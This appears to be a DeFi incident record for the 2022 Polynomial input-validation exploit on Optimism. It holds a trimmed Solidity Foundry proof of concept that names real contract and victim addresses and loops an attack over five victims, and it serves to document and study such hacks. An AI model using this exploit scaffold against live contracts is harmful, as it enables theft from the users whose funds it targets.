# [?] - Polynomial - No input validation

## Summary
Severity: Unknown
Chain: Optimism
Component: Polynomial
Published: 2022-11-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Polynomial_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~1.4K USD

```solidity
contract ContractTest is Test {
    // Constants
    IERC20 private constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 private constant WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 private constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    address private constant ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // State variables
    address private vuln = 0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150;
    PolynomialZap private zap = PolynomialZap(0xDEEB242E045e5827Edf526399bd13E7fFEba4281);
    PolynomialZap private zaps = PolynomialZap(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82);
    address private pool = 0x1D751bc1A723AccF1942122ca9aa82d49D08d2AE;

    // Victim addresses
    address[] private victims = [
        0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf,
        0x59022C79236A0F90bAc80b29357bc1d3e6d227d5,
        0xDa1521c966bc95324E156f4F04B28F2804985da5,
        0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161,
        0x316c42Af89b913429DBe4a86f30373172340A821
    ];

    function setUp() public {
        vm.createSelectFork("optimism", 39_343_642);
    }

    function testExploit() public {
        attack();
    }

    function attack() public {
        for (uint256 i = 0; i < victims.length; i++) {
            executeSwapAndDeposit(victims[i]);
        }
        emit log_named_decimal_uint(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Polynomial_exp.sol_
